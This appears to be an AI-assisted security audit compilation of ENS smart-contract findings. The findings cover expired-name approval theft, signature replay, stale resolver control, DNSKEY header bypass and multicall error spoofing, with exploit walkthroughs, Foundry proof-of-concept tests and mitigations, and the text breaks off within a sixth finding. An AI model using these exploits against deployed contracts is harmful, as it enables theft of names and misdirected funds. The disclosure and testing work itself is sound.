# ens-contracts Round Input

Source report: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/ens-contracts/report/audit-report.md`
Finding count: `23`

## Findings

### C-1 / `_qAeE89D1CAdrEK_KI7DX`
- Finding title: Expired ENS names can receive hidden ERC721 approvals that become active again after renewal
- Report lines: 159-262
```md
## [C-1]. Expired ENS names can receive hidden ERC721 approvals that become active again after renewal

## id: _qAeE89D1CAdrEK_KI7DX

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AuthByPass

## Location
BaseRegistrarImplementation.approve

## Finding Status: Valid
### Finding Status Justification: The root cause exists in the in-scope production contract BaseRegistrarImplementation, which overrides ownerOf() and _isApprovedOrOwner() to treat expired names as unowned, but does not override ERC721.approve(). With OpenZeppelin 4.9.x, inherited approve() resolves the owner using ERC721.ownerOf(tokenId), i.e. the base ERC721 storage owner, not the registrar's expiry-aware ownerOf(). Therefore, while expiries[id] <= block.timestamp, public BaseRegistrarImplementation.ownerOf(id) reverts and transfer/reclaim authorization through _isApprovedOrOwner() is blocked, but the stale ERC721 owner or an operator approved for that stale owner can still call approve(attacker, id). renew() only increments expiries[id] and does not clear token approvals. Once renewed, _isApprovedOrOwner() sees a live owner and accepts getApproved(id) == attacker, allowing transferFrom() or reclaim(). No complete safeguard is shown: expiry checks exist in ownerOf() and _isApprovedOrOwner(), but the exact approval path bypasses them; renew() does not clear approvals; and setApprovalForAll revocation does not clear per-token approvals. The exploit does not require admin/controller compromise: renewal is performed through normal controller flows, and the malicious actor can be a previously approved non-privileged operator using public ERC721 approval/transfer functions. The scenario depends on normal protocol/lifecycle behavior, not a victim-only arbitrary mistake or future integration. No documentation in the supplied material explicitly accepts hidden approvals on expired names as intended behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
BaseRegistrarImplementation overrides ownerOf() and _isApprovedOrOwner() so expired names are treated as unowned, but it inherits OpenZeppelin ERC721.approve() unchanged. In OZ 4.9, approve() uses ERC721.ownerOf(tokenId) internally, which bypasses BaseRegistrarImplementation.ownerOf() and reads the stale ERC721 owner stored before expiry. As a result, an old owner or previously approved operator can set a per-token approval while the name is expired and public ownerOf(id) reverts. If the name is renewed during the grace period, that stale approval immediately becomes usable for transferFrom() or reclaim(). Vulnerable snippet: function ownerOf(uint256 tokenId) public view override(IERC721, ERC721) returns (address) { require(expiries[tokenId] > block.timestamp); return super.ownerOf(tokenId); } ... function _isApprovedOrOwner(address spender,uint256 tokenId) internal view override returns (bool) { address owner = ownerOf(tokenId); return (spender == owner || getApproved(tokenId) == spender || isApprovedForAll(owner, spender)); } The missing override is approve(): inherited ERC721.approve() does not apply the expiry-aware ownerOf() gate.

## Impact
Direct theft of an ENS ERC721 name after renewal. A previously approved operator can preserve authority as a per-token approval while the name is expired, survive later operator revocation, and transfer the NFT once the victim renews during grace.

## Proof of Concept
1. Alice owns an ENS registrar token and has previously approved an operator, such as a marketplace, with setApprovalForAll. 2. The name expires but remains inside the 90 day grace period, so BaseRegistrarImplementation.ownerOf(id) reverts and the name is supposed to be unowned for authorization purposes. 3. Before Alice renews, the old operator calls inherited approve(attacker, id). This succeeds because ERC721.approve() uses the stale internal ERC721 owner instead of the registrar's expiry-aware ownerOf(). 4. Alice revokes the operator approval and renews the name during grace. 5. The attacker's per-token approval is still stored, so attacker calls transferFrom(alice, attacker, id) and steals the renewed ENS NFT.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/ethregistrar/BaseRegistrarImplementation.sol";

contract MockENS is ENS {
    mapping(bytes32 => address) public owners;
    function setOwnerForTest(bytes32 node, address owner_) external { owners[node] = owner_; }
    function owner(bytes32 node) external view override returns (address) { return owners[node]; }
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner_) external override returns (bytes32) { bytes32 subnode = keccak256(abi.encodePacked(node, label)); owners[subnode] = owner_; return subnode; }
    function setResolver(bytes32, address) external override {}
    function setRecord(bytes32 node, address owner_, address, uint64) external override { owners[node] = owner_; }
    function setSubnodeRecord(bytes32 node, bytes32 label, address owner_, address, uint64) external override { owners[keccak256(abi.encodePacked(node, label))] = owner_; }
    function setOwner(bytes32 node, address owner_) external override { owners[node] = owner_; }
    function setTTL(bytes32, uint64) external override {}
    function setApprovalForAll(address, bool) external override {}
    function resolver(bytes32) external pure override returns (address) { return address(0); }
    function ttl(bytes32) external pure override returns (uint64) { return 0; }
    function recordExists(bytes32 node) external view override returns (bool) { return owners[node] != address(0); }
    function isApprovedForAll(address, address) external pure override returns (bool) { return false; }
}

contract ExpiredApprovalPoC is Test {
    MockENS ens;
    BaseRegistrarImplementation registrar;
    bytes32 baseNode = keccak256("eth");
    uint256 id = uint256(keccak256("alice"));
    address controller = address(0xC011);
    address alice = address(0xA11CE);
    address operator = address(0x0A0A);
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.warp(100 days);
        ens = new MockENS();
        registrar = new BaseRegistrarImplementation(ens, baseNode);
        ens.setOwnerForTest(baseNode, address(registrar));
        registrar.addController(controller);
    }

    function testExpiredApprovalBecomesActiveAfterRenewal() public {
        vm.prank(controller);
        uint256 expiry = registrar.register(id, alice, 30 days);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, true);

        vm.warp(expiry + 1);
        vm.expectRevert();
        registrar.ownerOf(id);

        vm.prank(operator);
        registrar.approve(attacker, id);
        assertEq(registrar.getApproved(id), attacker);

        vm.prank(alice);
        registrar.setApprovalForAll(operator, false);
        assertEq(registrar.isApprovedForAll(alice, operator), false);

        vm.prank(controller);
        registrar.renew(id, 365 days);
        assertEq(registrar.ownerOf(id), alice);

        vm.prank(attacker);
        registrar.transferFrom(alice, attacker, id);
        assertEq(registrar.ownerOf(id), attacker);
    }
}


## Suggested Mitigation
Override approve() to use the expiry-aware ownerOf() or _isApprovedOrOwner() path, and reject approvals when expiries[tokenId] <= block.timestamp. Consider also overriding getApproved()/transfer authorization helpers consistently for expired names or clearing approvals when a name expires/renews.
```

### M-2 / `51MUeJkjADHOWM6JQl0XX`
- Finding title: Reusable reverse-name signatures let stale relayers overwrite newer DefaultReverseRegistrar records
- Report lines: 263-344
```md
## [M-2]. Reusable reverse-name signatures let stale relayers overwrite newer DefaultReverseRegistrar records

## id: 51MUeJkjADHOWM6JQl0XX

## Derived From Pattern/Invariant
PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
DefaultReverseRegistrar.setNameForAddrWithSignature

## Finding Status: Valid
### Finding Status Justification: The cited function exists in the in-scope DefaultReverseRegistrar. setNameForAddrWithSignature builds a message from address(this), selector, addr, signatureExpiry, and name, validates the signature, then calls _setName(addr, name). StandaloneReverseRegistrar._setName unconditionally overwrites _names[addr]. There is no nonce, used-digest mapping, monotonic version, or check that the current value has not changed since signing. signatureExpiry is a partial time bound, capped to at most one hour from validation time, but it does not consume the authorization and therefore does not fully block replay within the live window. The execution path is permissionless because any caller can submit the still-valid signature. This does not require a privileged role or compromised key; the signer intentionally authorizes a normal protocol flow, and the protocol flaw is that the authorization remains reusable after a newer record is set. No supplied code or documentation explicitly accepts stale replay overwriting newer reverse records as intended behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`setNameForAddrWithSignature` validates that `addr` signed the `(registrar, selector, addr, expiry, name)` tuple, but it never binds the authorization to a nonce and never consumes the signature after use. Any relayer or observer that obtains a still-unexpired signature can submit it repeatedly until `signatureExpiry`, including after the address owner has already set a newer reverse name. Vulnerable snippet: `signature.validateSignatureWithExpiry(addr, message, signatureExpiry); _setName(addr, name);`. Because `_setName` simply overwrites `_names[addr]`, the last replayed stale signature wins.

## Impact
Temporary griefing of reverse-name identity for the target address during the allowed signature window. Off-chain consumers that display reverse records can be forced back to an older signed name even after the owner submits a newer update. Under the ENS Immunefi scope this maps to Medium griefing rather than theft, because it does not transfer funds or NFTs.

## Proof of Concept
1. Alice signs an off-chain authorization to set her reverse name to `old.eth` with an expiry up to one hour in the future. 2. The relayer submits it once and `nameForAddr(alice)` becomes `old.eth`. 3. Alice updates her reverse name to `new.eth` using `setName("new.eth")` or a newer signature. 4. Before the old signature expires, any stale signature holder calls `setNameForAddrWithSignature(alice, oldExpiry, "old.eth", oldSig)` again. 5. The registrar accepts the same signature again because no nonce or used-message flag exists, and Alice's visible reverse name is overwritten back to `old.eth`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts-v5/utils/cryptography/MessageHashUtils.sol";
import "../contracts/reverseRegistrar/DefaultReverseRegistrar.sol";

contract DefaultReverseRegistrarReplayPoC is Test {
    using MessageHashUtils for bytes32;

    DefaultReverseRegistrar registrar;
    uint256 alicePk = 0xA11CE;
    address alice;

    function setUp() public {
        alice = vm.addr(alicePk);
        registrar = new DefaultReverseRegistrar();
    }

    function _signature(string memory name, uint256 expiry) internal view returns (bytes memory) {
        bytes32 message = keccak256(
            abi.encodePacked(
                address(registrar),
                registrar.setNameForAddrWithSignature.selector,
                alice,
                expiry,
                name
            )
        ).toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(alicePk, message);
        return abi.encodePacked(r, s, v);
    }

    function test_staleSignatureCanBeReplayedToOverwriteNewName() public {
        uint256 expiry = block.timestamp + 1 hours;
        bytes memory oldSig = _signature("old.eth", expiry);

        registrar.setNameForAddrWithSignature(alice, expiry, "old.eth", oldSig);
        assertEq(registrar.nameForAddr(alice), "old.eth");

        vm.prank(alice);
        registrar.setName("new.eth");
        assertEq(registrar.nameForAddr(alice), "new.eth");

        registrar.setNameForAddrWithSignature(alice, expiry, "old.eth", oldSig);
        assertEq(registrar.nameForAddr(alice), "old.eth");
    }
}

## Suggested Mitigation
Add per-address nonces to the signed payload and increment/consume the nonce before writing the new name, or store `usedDigest[message] = true` and reject reused authorizations. Prefer an EIP-712 domain that includes `chainId`, `verifyingContract`, nonce, expiry, and name.
```

### C-3 / `J8z405q9aEEOyFyX089YE`
- Finding title: Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution
- Report lines: 345-474
```md
## [C-3]. Expired .eth name re-registration without resolver leaves prior owner's resolver controlling resolution

## id: J8z405q9aEEOyFyX089YE

## Derived From Pattern/Invariant
AccountingInvariantViolation / stale resolver state must not survive expired re-registration without an explicit resolver

## Exploit Type
AccountingInvariantViolation

## Location
ETHRegistrarController.register

## Finding Status: Valid
### Finding Status Justification: The described code path exists in in-scope production contracts. In ETHRegistrarController.register, the resolver-zero branch calls base.register(labelhash, registration.owner, duration) and does not call ens.setRecord or otherwise clear resolver/TTL. BaseRegistrarImplementation._register, with updateRegistry=true, updates expiries, burns any expired ERC721, mints the token to the new owner, and calls ens.setSubnodeOwner(baseNode, bytes32(id), owner). ENSRegistry.setSubnodeOwner only updates records[subnode].owner through _setOwner and emits NewOwner; it does not change records[subnode].resolver or records[subnode].ttl. Therefore a resolver address previously set for the node can persist after re-registration. If the previous registrant selected a resolver contract they control, that resolver can continue returning or changing resolution data even after registry ownership moves to the new registrant, until the new registrant changes the resolver. The no-resolver path is explicitly supported by makeCommitment, provided data and reverseRecord are absent, so the preconditions are not impossible. There is no complete safeguard in this path: availability/grace-period checks only gate re-registration, and ownership transfer does not clear stale resolver state. This does not require privileged access, compromised keys, or purely victim misuse; it arises from normal public registration behavior with resolver == address(0). No supplied documentation explicitly accepts this exact stale resolver control risk as intentional, and the issue exists in the current code rather than depending on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When an expired name is re-registered with registration.resolver == address(0), ETHRegistrarController only calls base.register(id, registration.owner, duration). BaseRegistrarImplementation then updates the ENS subnode owner through ens.setSubnodeOwner(...), but ENSRegistry.setSubnodeOwner changes only records[subnode].owner and does not clear records[subnode].resolver or TTL. As a result, a resolver set by the previous registrant remains the active resolver for the newly registered name. If the old resolver is controlled by the old registrant, the old registrant can keep changing what the new owner's name resolves to after the NFT has been minted to the new owner. Vulnerable flow: `if (registration.resolver == address(0)) { expires = base.register(uint256(labelhash), registration.owner, registration.duration); }`; supporting registrar code then calls only `ens.setSubnodeOwner(baseNode, bytes32(id), owner);`, leaving the previous resolver untouched.

## Impact
The previous registrant can keep controlling resolution for a name now owned by a new user whenever the new registration uses the supported no-resolver path. This can redirect payments or integrations that resolve the name, causing direct theft of funds in motion and unintended alteration of what the ENS NFT/name represents until the new owner notices and updates the resolver.

## Proof of Concept
1. The attacker registers `stale.eth` with a resolver contract they control and configures it to resolve to the attacker's address. 2. The name expires and passes the registrar grace period, so it becomes available. 3. A victim registers the same label through ETHRegistrarController with `registration.resolver == address(0)`, which is an explicitly supported branch. 4. The controller/base registrar mints the ERC721 to the victim and updates ENS ownership, but the ENS resolver remains the attacker's resolver. 5. The attacker updates their resolver to a new receiving address after the victim owns the NFT. 6. Users or integrations resolving `stale.eth` receive the attacker's address and can send funds to the attacker while the victim is the registrar owner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "contracts/registry/ENSRegistry.sol";
import "contracts/ethregistrar/BaseRegistrarImplementation.sol";
import "contracts/ethregistrar/ETHRegistrarController.sol";
import "contracts/ethregistrar/IPriceOracle.sol";
import "contracts/resolvers/profiles/IAddrResolver.sol";

contract FixedPriceOracle is IPriceOracle {
    function price(string calldata, uint256, uint256) external pure returns (IPriceOracle.Price memory) {
        return IPriceOracle.Price({base: 1 ether, premium: 0});
    }
}

contract MutableResolver is IAddrResolver {
    address public controller;
    address payable public target;
    constructor(address payable initialTarget) { controller = msg.sender; target = initialTarget; }
    function setTarget(address payable newTarget) external { require(msg.sender == controller); target = newTarget; }
    function addr(bytes32) external view returns (address payable) { return target; }
    function supportsInterface(bytes4) external pure returns (bool) { return false; }
}

contract NoopReverseRegistrar is IReverseRegistrar {
    function setDefaultResolver(address) external {}
    function claim(address) external pure returns (bytes32) { return bytes32(0); }
    function claimForAddr(address, address, address) public pure returns (bytes32) { return bytes32(0); }
    function claimWithResolver(address, address) external pure returns (bytes32) { return bytes32(0); }
    function setName(string memory) external pure returns (bytes32) { return bytes32(0); }
    function setNameForAddr(address, address, address, string memory) external pure returns (bytes32) { return bytes32(0); }
    function node(address) external pure returns (bytes32) { return bytes32(0); }
}

contract NoopDefaultReverseRegistrar is IDefaultReverseRegistrar {
    function setName(string memory) external {}
    function setNameForAddrWithSignature(address, uint256, string memory, bytes memory) external {}
    function setNameForAddr(address, string memory) external {}
}

contract ETHRegistrarControllerStaleResolverPoC is Test {
    bytes32 constant ETH_NODE = 0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;
    ENSRegistry ens;
    BaseRegistrarImplementation base;
    ETHRegistrarController controller;
    FixedPriceOracle oracle;
    MutableResolver oldResolver;
    address oldOwner = address(0xA11CE);
    address newOwner = address(0xB0B);
    address payable attackerSink1 = payable(address(0x1111));
    address payable attackerSink2 = payable(address(0x2222));

    function setUp() public {
        vm.warp(1000 days);
        ens = new ENSRegistry();
        base = new BaseRegistrarImplementation(ENS(address(ens)), ETH_NODE);
        bytes32 ethLabel = keccak256(bytes("eth"));
        ens.setSubnodeOwner(bytes32(0), ethLabel, address(base));
        oracle = new FixedPriceOracle();
        controller = new ETHRegistrarController(base, oracle, 1, 90 days, IReverseRegistrar(address(new NoopReverseRegistrar())), IDefaultReverseRegistrar(address(new NoopDefaultReverseRegistrar())), ENS(address(ens)));
        base.addController(address(controller));
        oldResolver = new MutableResolver(attackerSink1);
    }

    function _commitAndRegister(ETHRegistrarController.Registration memory r, address caller) internal returns (uint256) {
        bytes32 c = controller.makeCommitment(r);
        controller.commit(c);
        vm.warp(block.timestamp + 2);
        vm.deal(caller, 10 ether);
        vm.prank(caller);
        controller.register{value: 1 ether}(r);
        return base.nameExpires(uint256(keccak256(bytes(r.label))));
    }

    function testExpiredReregistrationKeepsPriorResolverControl() public {
        ETHRegistrarController.Registration memory first = ETHRegistrarController.Registration({label: "stale", owner: oldOwner, duration: 28 days, secret: bytes32("old"), resolver: address(oldResolver), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        uint256 expires = _commitAndRegister(first, oldOwner);
        bytes32 node = keccak256(abi.encodePacked(ETH_NODE, keccak256(bytes("stale"))));
        assertEq(ens.owner(node), oldOwner);
        assertEq(ens.resolver(node), address(oldResolver));
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink1);

        vm.warp(expires + base.GRACE_PERIOD() + 1);

        ETHRegistrarController.Registration memory second = ETHRegistrarController.Registration({label: "stale", owner: newOwner, duration: 28 days, secret: bytes32("new"), resolver: address(0), data: new bytes[](0), reverseRecord: 0, referrer: bytes32(0)});
        _commitAndRegister(second, newOwner);

        assertEq(base.ownerOf(uint256(keccak256(bytes("stale")))), newOwner);
        assertEq(ens.owner(node), newOwner);
        assertEq(ens.resolver(node), address(oldResolver));

        oldResolver.setTarget(attackerSink2);
        assertEq(IAddrResolver(ens.resolver(node)).addr(node), attackerSink2);
    }
}

## Suggested Mitigation
When registering without an explicit resolver, clear resolver and TTL for the namehash instead of only changing ownership. For example, have the controller call `ens.setRecord(namehash, registration.owner, address(0), 0)` after `base.register(...)`, or add a registrar path that updates the registry owner and clears resolver/TTL atomically for re-registrations.
```

### H-4 / `VBCthqJsNe58AfV8cKuzh`
- Finding title: P256SHA256Algorithm.verify accepts DNSKEY material that is not bound to DNSSEC Algorithm 13
- Report lines: 475-539
```md
## [H-4]. P256SHA256Algorithm.verify accepts DNSKEY material that is not bound to DNSSEC Algorithm 13

## id: VBCthqJsNe58AfV8cKuzh

## Derived From Pattern/Invariant
EIP1271ByPass / Signature validation bypass via missing validation guards

## Exploit Type
StandardViolation

## Location
P256SHA256Algorithm.verify

## Finding Status: Valid
### Finding Status Justification: The code shown directly skips the 4-byte DNSKEY header and never enforces the documented Algorithm 13 binding. The finding is valid when this verifier is used as the Algorithm 13 DNSSEC authority without a separate upstream header check.
### Finding Complexity: 3
## Minimim Privilege Required:Permissionless


## Description
The verifier is documented as the DNSSEC Algorithm 13 implementation and accepts DNSKEY RDATA formatted as a 4-byte DNSKEY header followed by a 64-byte P-256 public key. However, it only checks the total key length and then skips the DNSKEY header entirely. As a result, a key whose DNSKEY protocol/algorithm fields are not protocol 3 and algorithm 13 can still return true as long as the trailing 64 bytes are a P-256 public key accepted by the precompile. Vulnerable snippet: `require(key.length == 68, "Invalid p256 key length"); ... qx := calldataload(add(key.offset, 4)); qy := calldataload(add(key.offset, 36)); return P256Precompile.verify(sha256(data), r, s, qx, qy);`. The missing checks are `key[2] == 0x03` and `key[3] == 0x0d`. If the upstream DNSSEC oracle routes a DNSKEY blob to this Algorithm 13 verifier without independently enforcing those header bytes, DNSSEC proof validation can accept key material that DNSSEC itself does not classify as ECDSAP256SHA256.

## Impact
Invalid DNSSEC proof material can be accepted by the Algorithm 13 module when integrated without an upstream header check. In the ENS DNSSEC import path this can allow unauthorized proof acceptance for DNS-backed ENS operations, potentially leading to unauthorized DNS name claims or resolver/control changes. The direct vulnerable contract is stateless and holds no funds, so the impact depends on the DNSSEC oracle integration using this verifier as the Algorithm 13 authority.

## Proof of Concept
1. Deploy P256SHA256Algorithm. 2. Ensure the P-256 precompile returns success for a supplied P-256 public key/signature over the data. 3. Construct a 68-byte DNSKEY RDATA value where bytes 4..67 are the accepted public key but byte 2 is not 0x03 and byte 3 is not 0x0d. 4. Call verify(key, data, signature). 5. The call returns true even though the DNSKEY header does not declare DNSSEC protocol 3 / algorithm 13.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "forge-std/Test.sol";
import "../contracts/dnssec-oracle/algorithms/P256SHA256Algorithm.sol";

contract P256SHA256AlgorithmHeaderBypassTest is Test {
    function testAcceptsNonAlgorithm13DnskeyHeader() public {
        // Mock address 0x100 as an EIP-7951 precompile that returns 0x...01.
        vm.etch(address(uint160(0x100)), hex"600160005260206000f3");

        P256SHA256Algorithm alg = new P256SHA256Algorithm();

        bytes memory key = new bytes(68);
        key[0] = 0x01;
        key[1] = 0x00;
        key[2] = 0x00; // invalid DNSKEY protocol; expected 0x03
        key[3] = 0x08; // invalid algorithm; expected 0x0d
        for (uint256 i = 4; i < 68; i++) {
            key[i] = bytes1(uint8(i));
        }

        bytes memory sig = new bytes(64);
        for (uint256 i = 0; i < 64; i++) {
            sig[i] = bytes1(uint8(i + 1));
        }

        bool ok = alg.verify(key, bytes("signed rrset"), sig);
        assertTrue(ok, "non-Algorithm-13 DNSKEY header was rejected");
    }
}

## Suggested Mitigation
Validate the DNSKEY header before extracting qx/qy: `require(uint8(key[2]) == 3, "Invalid DNSKEY protocol"); require(uint8(key[3]) == 13, "Invalid DNSKEY algorithm");`. Keep the existing exact length checks before reading calldata.
```

### M-5 / `6iLweelVLw3pz3C8yl6Jl`
- Finding title: UniversalResolver multicall returns failed CCIP batch lookups as successful resolver results
- Report lines: 540-662
```md
## [M-5]. UniversalResolver multicall returns failed CCIP batch lookups as successful resolver results

## id: 6iLweelVLw3pz3C8yl6Jl

## Derived From Pattern/Invariant
StandardViolation / StateMachine invariant: multicall resolution must not encode failed lookups as successful return values

## Exploit Type
StandardViolation

## Location
AbstractUniversalResolver.resolveBatchCallback

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in the provided production UniversalResolver inheritance path. AbstractUniversalResolver._callResolver detects IMulticallable.multicall, splits the embedded calls, wraps them for extended resolvers, and routes them through ccipBatch. CCIPBatcher.ccipBatchCallback marks failed offchain responses with FLAG_BATCH_ERROR and assigns the gateway-supplied response bytes to lu.data. AbstractUniversalResolver.resolveBatchCallback then handles multi=true by iterating all lookups, setting v = lu.data, only conditionally unwrapping extended successful responses, and placing v into the returned bytes[] without checking FLAG_BATCH_ERROR, FLAG_CALL_ERROR, or FLAG_EMPTY_RESPONSE. The non-multicall branch does perform these checks and reverts/propagates errors, proving the multicall branch has materially different failure semantics. No complete safeguard blocks the exact path for failed batch items in multicall. The affected behavior is in the UniversalResolver production flow, which is in audit scope. The path is permissionless for any caller resolving a name whose resolver/lookup uses the batch gateway path; a malicious or compromised gateway response can provide ABI-shaped bytes for a failed sublookup, and the contract returns them as a normal multicall item. This does not require privileged ENS roles or victim misuse beyond normal use of UniversalResolver multicall. The exact risk is not documented as intentionally accepted, and it exists in the current code rather than depending on a future integration.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
In the multicall branch, resolveBatchCallback copies every lookup's data into the returned bytes[] without checking FLAG_BATCH_ERROR, FLAG_CALL_ERROR, or FLAG_EMPTY_RESPONSE. The single-call branch correctly propagates these errors, but multicall resolution treats the same failed lookup bytes as a normal resolver return value.

Vulnerable snippet:
if (multi) {
    bytes[] memory m = new bytes[](lookups.length);
    for (uint256 i; i < lookups.length; ++i) {
        Lookup memory lu = lookups[i];
        bytes memory v = lu.data;
        if (extended && (lu.flags & FLAGS_ANY_ERROR) == 0) {
            v = abi.decode(v, (bytes));
        }
        m[i] = v;
    }
    answer = abi.encode(m);
}

A batch gateway failure is untrusted data. In ccipBatchCallback, a failed gateway response sets FLAG_BATCH_ERROR and stores the gateway-supplied bytes in lu.data. For non-multicall resolution this reverts, but for multicall the gateway-supplied failure payload is returned as a successful item. If an integration resolves multiple records through UniversalResolver.multicall and decodes each returned bytes element as a resolver response, an attacker-controlled or malicious batch gateway can inject ABI-shaped values for failed subcalls.

## Impact
A failed resolver lookup can be surfaced as a successful resolver answer. This can spoof ENS resolution data for clients using UniversalResolver multicall over CCIP-read, causing user-facing identity/address misresolution and griefing or misdirected value transfers by affected integrations.

## Proof of Concept
1. A victim client calls UniversalResolver.resolve(name, multicall([addr(node), text(node, key)])) through the batch gateway path.
2. The batch gateway marks the addr(node) lookup as failed but supplies response bytes equal to abi.encode(attackerAddress).
3. ccipBatchCallback records FLAG_BATCH_ERROR and lu.data = abi.encode(attackerAddress).
4. resolveBatchCallback enters the multi branch and returns lu.data inside the bytes[] instead of reverting.
5. The victim client decodes the first multicall item as a successful addr() response and displays or uses attackerAddress.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../contracts/universalResolver/UniversalResolver.sol";
import "../contracts/registry/ENSRegistry.sol";
import "../contracts/resolvers/profiles/IAddrResolver.sol";
import "../contracts/ccipRead/IGatewayProvider.sol";
import "../contracts/reverseRegistrar/IReverseRegistrar.sol";

contract MockGatewayProvider is IGatewayProvider {
    function gateways() external pure returns (string[] memory urls) {
        urls = new string[](0);
    }
}

contract MockReverseRegistrar is IReverseRegistrar {
    function setDefaultResolver(address) external {}
    function claim(address) external pure returns (bytes32) { return bytes32(uint256(1)); }
    function claimForAddr(address, address, address) external pure returns (bytes32) { return bytes32(uint256(1)); }
    function claimWithResolver(address, address) external pure returns (bytes32) { return bytes32(uint256(1)); }
    function setName(string memory) external pure returns (bytes32) { return bytes32(uint256(1)); }
    function setNameForAddr(address, address, address, string memory) external pure returns (bytes32) { return bytes32(uint256(1)); }
    function node(address) external pure returns (bytes32) { return bytes32(uint256(1)); }
}

contract UniversalResolverMulticallFailurePoC is Test {
    function test_multicallBatchFailureIsReturnedAsSuccess() public {
        ENSRegistry ens = new ENSRegistry();
        MockReverseRegistrar reverseRegistrar = new MockReverseRegistrar();
        bytes32 reverseNode = keccak256(abi.encodePacked(bytes32(0), keccak256(bytes("reverse"))));
        bytes32 addrReverseNode = keccak256(abi.encodePacked(reverseNode, keccak256(bytes("addr"))));
        ens.setSubnodeOwner(bytes32(0), keccak256(bytes("reverse")), address(this));
        ens.setSubnodeOwner(reverseNode, keccak256(bytes("addr")), address(reverseRegistrar));
        assertEq(ens.owner(addrReverseNode), address(reverseRegistrar));

        UniversalResolver ur = new UniversalResolver(address(this), ENS(address(ens)), new MockGatewayProvider());

        CCIPBatcher.Lookup[] memory lookups = new CCIPBatcher.Lookup[](2);
        bytes memory forgedFailurePayload = abi.encode(address(0xBEEF));
        bytes memory honestPayload = abi.encode(address(0xCAFE));
        lookups[0] = CCIPBatcher.Lookup({
            target: address(0x1111),
            call: abi.encodeCall(IAddrResolver.addr, (bytes32(0))),
            data: forgedFailurePayload,
            flags: uint256(1 << 2)
        });
        lookups[1] = CCIPBatcher.Lookup({
            target: address(0x1111),
            call: abi.encodeCall(IAddrResolver.addr, (bytes32(uint256(1)))),
            data: honestPayload,
            flags: uint256(0)
        });
        CCIPBatcher.Batch memory batch = CCIPBatcher.Batch({lookups: lookups, gateways: new string[](0)});

        bytes memory extraData = abi.encode(false, true, ur.resolveCallback.selector, abi.encode(address(0x1234)));
        (bool ok, bytes memory ret) = address(ur).staticcall(
            abi.encodeCall(ur.resolveBatchCallback, (abi.encode(batch), extraData))
        );

        assertTrue(ok);
        (bytes memory answer, address resolver) = abi.decode(ret, (bytes, address));
        assertEq(resolver, address(0x1234));
        bytes[] memory items = abi.decode(answer, (bytes[]));
        assertEq(items.length, 2);
        assertEq(items[0], forgedFailurePayload);
        assertEq(abi.decode(items[0], (address)), address(0xBEEF));
    }
}

## Suggested Mitigation
Make multicall error semantics match the single-call path. In the multi branch, inspect each Lookup before adding it to the result: revert and propagate FLAG_BATCH_ERROR, FLAG_CALL_ERROR, and FLAG_EMPTY_RESPONSE, or return a structured per-item success/error type that cannot be decoded as a successful resolver response. For ENS-compatible multicall behavior, the safest fix is to revert the whole multicall on any failed lookup.
```

### M-6 / `czakDZoLlxs5lgJdEaovq`
- Finding title: Multicoin addr resolution returns address ABI and rejects valid non-20-byte ENSIP-11 records
- Report lines: 663-737
```md
## [M-6]. Multicoin addr resolution returns address ABI and rejects valid non-20-byte ENSIP-11 records

## id: czakDZoLlxs5lgJdEaovq

## Derived From Pattern/Invariant
StandardViolation / ENSIP-11 multicoin address records must return ABI-encoded bytes payloads

## Exploit Type
StandardViolation

## Location
ExtendedDNSResolver._resolveAddress

## Finding Status: Valid
### Finding Status Justification: The claimed code path exists in the in-scope ExtendedDNSResolver._resolveAddress. For IAddressResolver.addr(bytes32,uint256), the interface return type is bytes memory, so resolve should return ABI-encoded bytes return data. Instead, after _findValue, the function returns raw empty bytes for missing values, parses any nonempty value through hexToAddress(2, value.length), and returns abi.encode(record), which is address ABI data. HexUtils.hexToAddress requires exactly 40 hex characters after offset 2, so valid ENSIP-11 non-20-byte binary payloads encoded as hex are rejected. The contract comments explicitly say a[coinType] values are 0x-prefixed hexadecimal and returned unmodified, including non-EVM addresses translated into binary then hex-encoded. No complete safeguard preserves the bytes ABI or supports arbitrary byte lengths. The issue is in production scoped code, is contrary to the documented behavior, is reachable today through resolve calls for multicoin addr data and DNS TXT context, and does not require privileged compromise, victim-only misuse, or future integration assumptions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
IAddressResolver.addr(bytes32,uint256) returns bytes memory, so ExtendedDNSResolver.resolve must return abi.encode(bytesPayload). Instead, _resolveAddress parses every nonempty value with hexToAddress(2, value.length), requiring exactly 40 hex nibbles after the prefix, and returns abi.encode(record), an address ABI word. It also returns raw empty bytes when no record is found. This violates the documented a[coinType] format, which says 0x-prefixed hexadecimal values are returned unmodified as binary bytes, including non-EVM coin types and arbitrary byte lengths accepted by address-encoder.

## Impact
Valid DNS-backed multicoin records cannot be resolved through the standard ENS resolver ABI. Non-20-byte records revert, 20-byte records are not ABI-decodable as bytes, and missing records return malformed resolver output. Wallets and UniversalResolver integrations can be griefed or broken for DNS-backed multicoin address resolution.

## Proof of Concept
